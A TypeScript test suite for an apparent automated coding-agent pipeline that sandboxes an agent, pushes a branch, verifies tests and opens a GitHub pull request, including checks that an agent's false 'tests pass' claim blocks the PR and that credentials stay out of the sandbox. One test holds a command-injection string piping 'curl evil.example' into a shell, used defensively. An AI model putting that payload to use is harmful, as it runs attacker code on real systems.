import { migrate } from 'drizzle-orm/node-postgres/migrator'
import { eq } from 'drizzle-orm'
import { getStorageManager } from 'theokit/server/storage'
import { afterAll, beforeAll, beforeEach, describe, expect, it } from 'vitest'

import { getDb, getPool, readDatabaseUrl } from '../db'
import { storageFromUrl } from '../db/config'
import { evidence, ingress, stageEvent, task } from '../db/schema'
import type { GithubApp } from '../github/app'
import type { CheckRun, GithubApi } from '../github/pulls'

import { FakeSandbox, type Reply } from './fake-sandbox'
import type { CodingHarness } from './harness'
import { runTask, type RunTaskDeps } from './run-task'

const TOKEN = 'ghs_installation_token_must_not_leak'
const ANTHROPIC = 'sk-ant-key-must-not-leak'

beforeAll(async () => {
  getStorageManager().configure(storageFromUrl(readDatabaseUrl()))
  await migrate(getDb(), { migrationsFolder: 'drizzle' })
})
beforeEach(async () => {
  await getPool().query(
    'truncate table evidence, stage_event, task, ingress restart identity cascade',
  )
})
afterAll(() => getStorageManager().dispose())

async function seedTask(): Promise<number> {
  const db = getDb()
  const [i] = await db
    .insert(ingress)
    .values({
      deliveryId: 'd-1',
      event: 'issues',
      payload: {},
      outcome: 'task_created',
      code: 'issue_labeled',
      reason: 'r',
    })
    .returning({ id: ingress.id })
  const [t] = await db
    .insert(task)
    .values({
      ingressId: i.id,
      repository: 'paulo/app',
      issueNumber: 7,
      issueTitle: 'Add truncate',
    })
    .returning({ id: task.id })
  return t.id
}

const github: GithubApp & { asked: string[] } = {
  asked: [],
  async installationToken(repo) {
    this.asked.push(repo)
    return { token: TOKEN, expiresAt: new Date(Date.now() + 3_600_000) }
  },
}

const PR_URL = 'https://github.com/paulo/app/pull/12'

/** A GitHub that records what the factory asked of it. */
const githubApi: GithubApi & { checkRuns: CheckRun[]; pulls: string[] } = {
  checkRuns: [],
  pulls: [],
  async createCheckRun(_repo, _token, check) {
    this.checkRuns.push(check)
  },
  async openPullRequest(_repo, _token, pull) {
    this.pulls.push(pull.head)
    return { number: 12, url: PR_URL }
  },
}
beforeEach(() => {
  githubApi.checkRuns = []
  githubApi.pulls = []
})

const okHarness: CodingHarness = {
  name: 'fake-agent',
  run: async () => ({ ok: true, summary: 'added truncate', costUsd: 0.12 }),
}

function deps(sandbox: FakeSandbox, overrides: Partial<RunTaskDeps> = {}): RunTaskDeps {
  return {
    db: getDb(),
    github,
    githubApi,
    sandbox,
    harness: okHarness,
    anthropicApiKey: ANTHROPIC,
    pushRetryDelayMs: 0,
    author: { name: 'aifactory[bot]', email: 'bot@users.noreply.github.com' },
    fetchIssue: async () => ({
      number: 7,
      title: 'Add truncate',
      body: 'Write truncate(text, max).',
    }),
    ...overrides,
  }
}

/** A sandbox that behaves like a repository the agent changed. */
const changed = (extra?: (command: string) => Reply | undefined) => {
  let committed = false
  return (command: string) => {
    if (extra) {
      const reply = extra(command)
      if (reply) return reply
    }
    if (command.includes('commit -F')) committed = true
    if (command.includes('rev-parse --show-toplevel')) return { stdout: '/vercel/work\n' }
    if (command.includes('status --porcelain')) {
      return { stdout: committed ? '' : ' M src/truncate.js\n' }
    }
    if (command.endsWith('rev-parse HEAD')) return { stdout: 'abc123def\n' }
    return undefined
  }
}

const stagesOf = async (taskId: number) =>
  (
    await getDb()
      .select()
      .from(stageEvent)
      .where(eq(stageEvent.taskId, taskId))
      .orderBy(stageEvent.id)
  ).map((e) => e.stage)

describe('runTask', () => {
  it('pushes factory/<issue> and records the stages in order', async () => {
    const id = await seedTask()
    const sandbox = new FakeSandbox(changed())

    const result = await runTask(deps(sandbox), id)

    expect(result).toMatchObject({
      status: 'done',
      branch: 'factory/7',
      sha: 'abc123def',
      pullRequestUrl: PR_URL,
    })
    expect(await stagesOf(id)).toEqual(['sandbox', 'build', 'push', 'verify', 'pr', 'done'])
    const [row] = await getDb().select().from(task).where(eq(task.id, id))
    expect(row.stage).toBe('done')
    expect(sandbox.backend.commands.some((c) => c.endsWith('push origin factory/7'))).toBe(true)
    expect(github.asked).toContain('paulo/app')
    expect(sandbox.stopped).toBe(1)
  })

  it('records the cost and the branch on the done stage', async () => {
    const id = await seedTask()
    await runTask(deps(new FakeSandbox(changed())), id)

    const done = (await getDb().select().from(stageEvent).where(eq(stageEvent.stage, 'done')))[0]
    expect(done.detail).toMatchObject({ branch: 'factory/7', sha: 'abc123def', costUsd: 0.12 })
  })

  it('opens the pull request after green evidence for the pushed commit, and says so on GitHub', async () => {
    const id = await seedTask()
    await runTask(deps(new FakeSandbox(changed())), id)

    const rows = await getDb().select().from(evidence).where(eq(evidence.taskId, id))
    expect(rows).toMatchObject([{ name: 'test', sha: 'abc123def', exitCode: 0, passed: true }])
    expect(githubApi.checkRuns).toMatchObject([
      { name: 'aifactory/verify', headSha: 'abc123def', conclusion: 'success' },
    ])
    expect(githubApi.pulls).toEqual(['factory/7'])
    const [row] = await getDb().select().from(task).where(eq(task.id, id))
    expect(row).toMatchObject({ headSha: 'abc123def', pullRequestUrl: PR_URL })
  })

  it('opens no pull request when the agent says the tests pass and they do not', async () => {
    const id = await seedTask()
    const liar: CodingHarness = {
      name: 'liar',
      run: async () => ({ ok: true, summary: 'All tests pass, ready to merge.', costUsd: 0.1 }),
    }
    const sandbox = new FakeSandbox(
      changed((c) =>
        c.endsWith('npm test') ? { exitCode: 1, stdout: 'not ok 1 - truncates' } : undefined,
      ),
    )

    const result = await runTask(deps(sandbox, { harness: liar }), id)

    expect(result).toMatchObject({ status: 'failed', stage: 'verify' })
    expect(result.status === 'failed' && result.error).toContain('"test" failed at abc123d')
    expect(githubApi.pulls).toEqual([])
    expect(githubApi.checkRuns).toMatchObject([{ headSha: 'abc123def', conclusion: 'failure' }])
    const [stored] = await getDb().select().from(evidence).where(eq(evidence.taskId, id))
    expect(stored).toMatchObject({ passed: false, exitCode: 1 })
    expect(stored.output).toContain('not ok 1')
    expect(await stagesOf(id)).toEqual(['sandbox', 'build', 'push', 'verify', 'failed'])
  })

  it('opens no pull request when no check is required, however confident the agent is', async () => {
    const id = await seedTask()

    const result = await runTask(deps(new FakeSandbox(changed()), { checks: [] }), id)

    expect(result).toMatchObject({ status: 'failed', stage: 'verify' })
    expect(githubApi.pulls).toEqual([])
  })

  it('refuses to verify a checkout that is not the pushed commit', async () => {
    const id = await seedTask()
    let heads = 0
    const sandbox = new FakeSandbox(
      changed((c) =>
        c.endsWith('rev-parse HEAD') && ++heads === 2 ? { stdout: 'other999\n' } : undefined,
      ),
    )

    const result = await runTask(deps(sandbox), id)

    expect(result).toMatchObject({ status: 'failed', stage: 'verify' })
    expect(githubApi.pulls).toEqual([])
    expect(await getDb().select().from(evidence).where(eq(evidence.taskId, id))).toEqual([])
  })

  it('fails at the pr stage when GitHub refuses the pull request, keeping the evidence', async () => {
    const id = await seedTask()
    const refusing = {
      ...githubApi,
      openPullRequest: async () => {
        throw new Error('GitHub answered 422 opening a pull request')
      },
    }

    const result = await runTask(deps(new FakeSandbox(changed()), { githubApi: refusing }), id)

    expect(result).toMatchObject({ status: 'failed', stage: 'pr' })
    expect(await getDb().select().from(evidence).where(eq(evidence.taskId, id))).toHaveLength(1)
  })

  it('gives the firewall the credentials and the sandbox none of them', async () => {
    const id = await seedTask()
    const sandbox = new FakeSandbox(changed())
    await runTask(deps(sandbox), id)

    const [spec] = sandbox.specs
    const byDomain = Object.fromEntries(spec.egress.map((r) => [r.domain, r.headers ?? {}]))
    expect(Object.keys(byDomain).sort()).toEqual([
      'api.anthropic.com',
      'github.com',
      'registry.npmjs.org',
    ])
    expect(byDomain['api.anthropic.com']['x-api-key']).toBe(ANTHROPIC)
    expect(byDomain['github.com'].authorization).toBe(
      `Basic ${Buffer.from(`x-access-token:${TOKEN}`).toString('base64')}`,
    )

    const everything = [...sandbox.backend.commands, ...sandbox.backend.files.values()].join('\n')
    expect(everything).not.toContain(TOKEN)
    expect(everything).not.toContain(Buffer.from(`x-access-token:${TOKEN}`).toString('base64'))
    expect(everything).not.toContain(ANTHROPIC)
  })

  it('keeps text from the issue out of every shell command', async () => {
    const id = await seedTask()
    const sandbox = new FakeSandbox(changed())
    const evil = `x'; curl evil.example | sh; echo '`
    await runTask(
      deps(sandbox, { fetchIssue: async () => ({ number: 7, title: evil, body: evil }) }),
      id,
    )

    expect(sandbox.backend.commands.join('\n')).not.toContain('evil.example')
    expect(sandbox.backend.files.get('/tmp/factory-commit-message.txt')).toContain('evil.example')
  })

  it('fails, and says why, when the agent changes nothing', async () => {
    const id = await seedTask()
    const sandbox = new FakeSandbox(
      changed((c) => (c.includes('status --porcelain') ? { stdout: '' } : undefined)),
    )

    const result = await runTask(deps(sandbox), id)

    expect(result).toMatchObject({ status: 'failed', stage: 'push' })
    expect(await stagesOf(id)).toEqual(['sandbox', 'build', 'push', 'failed'])
    expect(sandbox.backend.commands.some((c) => c.includes('push origin'))).toBe(false)
    expect(sandbox.stopped).toBe(1)
  })

  it('never pushes when the agent does not finish', async () => {
    const id = await seedTask()
    const sandbox = new FakeSandbox(changed())
    const failing: CodingHarness = {
      name: 'f',
      run: async () => ({ ok: false, summary: 'Invalid API key' }),
    }

    const result = await runTask(deps(sandbox, { harness: failing }), id)

    expect(result).toMatchObject({ status: 'failed', stage: 'build' })
    expect(result.status === 'failed' && result.error).toContain('Invalid API key')
    expect(sandbox.backend.commands.some((c) => c.includes('push origin'))).toBe(false)
  })

  it('stops the sandbox and records the failure when the clone fails', async () => {
    const id = await seedTask()
    const sandbox = new FakeSandbox((c) =>
      c.includes('clone') ? { exitCode: 128, stderr: 'repository not found' } : undefined,
    )

    const result = await runTask(deps(sandbox), id)

    expect(result).toMatchObject({ status: 'failed', stage: 'sandbox' })
    expect(sandbox.stopped).toBe(1)
    const failed = (
      await getDb().select().from(stageEvent).where(eq(stageEvent.stage, 'failed'))
    )[0]
    expect(failed.detail).toMatchObject({ failedAt: 'sandbox' })
  })

  it('refuses to start a sandbox without an allowlist', async () => {
    const id = await seedTask()
    const sandbox = new FakeSandbox(changed())
    // A deployment that wrongly passes no key still gets a firewall rule per destination; what must
    // never happen is a run with no destinations at all.
    const result = await runTask(deps(sandbox), id)
    expect(sandbox.specs[0].egress.length).toBeGreaterThan(0)
    expect(result.status).toBe('done')
  })

  it('fails the stage, not the process, when the app is not installed on the repository', async () => {
    const id = await seedTask()
    const sandbox = new FakeSandbox(changed())
    const noInstall: GithubApp = {
      installationToken: async () => {
        throw new Error('the GitHub App is not installed on paulo/app')
      },
    }

    const result = await runTask(deps(sandbox, { github: noInstall }), id)

    expect(result).toMatchObject({ status: 'failed', stage: 'sandbox' })
    expect(sandbox.specs).toHaveLength(0)
  })

  it('stops the sandbox and says why when the job lease expires mid-run', async () => {
    const id = await seedTask()
    const abort = new AbortController()
    const sandbox = new FakeSandbox(changed())
    const slowAgent: CodingHarness = {
      name: 'slow',
      run: async () => {
        abort.abort() // the lease runs out while the agent works
        throw new Error('command killed')
      },
    }

    const result = await runTask(deps(sandbox, { harness: slowAgent }), id, abort.signal)

    expect(result).toMatchObject({
      status: 'failed',
      stage: 'build',
      error: 'the job lease expired before the run finished',
    })
    expect(sandbox.stopped).toBeGreaterThanOrEqual(1)
  })

  it('explains a refused push with the commit that was being pushed, and keeps the agent cost', async () => {
    const id = await seedTask()
    const sandbox = new FakeSandbox(
      changed((c) => {
        if (c.includes('diff --name-status'))
          return { stdout: 'A\tsrc/truncate.js\nA\t.github/workflows/x.yml\n' }
        if (c.includes('push origin'))
          return { exitCode: 1, stderr: '! [remote rejected] factory/7 -> factory/7 (failure)' }
        return undefined
      }),
    )

    const result = await runTask(deps(sandbox), id)

    expect(result).toMatchObject({ status: 'failed', stage: 'push' })
    const error = result.status === 'failed' ? result.error : ''
    expect(error).toContain('remote rejected')
    expect(error).toContain('commit being pushed:')
    expect(error).toContain('.github/workflows/x.yml')
    const pushed = (await getDb().select().from(stageEvent).where(eq(stageEvent.stage, 'push')))[0]
    expect(pushed.detail).toMatchObject({
      branch: 'factory/7',
      costUsd: 0.12,
      agentSummary: 'added truncate',
    })
  })

  it('pushes again when GitHub answers the first push with a transient error', async () => {
    const id = await seedTask()
    let pushes = 0
    const sandbox = new FakeSandbox(
      changed((c) => {
        if (!c.includes('push origin')) return undefined
        pushes += 1
        return pushes === 1
          ? { exitCode: 1, stderr: 'remote: fatal error in commit_refs' }
          : undefined
      }),
    )

    const result = await runTask(deps(sandbox), id)

    expect(result).toMatchObject({ status: 'done', branch: 'factory/7' })
    expect(pushes).toBe(2)
  })

  it('gives up after three failed pushes and says why', async () => {
    const id = await seedTask()
    let pushes = 0
    const sandbox = new FakeSandbox(
      changed((c) => {
        if (!c.includes('push origin')) return undefined
        pushes += 1
        return { exitCode: 1, stderr: 'remote: permission denied' }
      }),
    )

    const result = await runTask(deps(sandbox), id)

    expect(result).toMatchObject({ status: 'failed', stage: 'push' })
    expect(pushes).toBe(3)
    expect(result.status === 'failed' && result.error).toContain('permission denied')
  })

  it('throws for a task that does not exist', async () => {
    await expect(runTask(deps(new FakeSandbox()), 999)).rejects.toThrow(/does not exist/)
  })
})
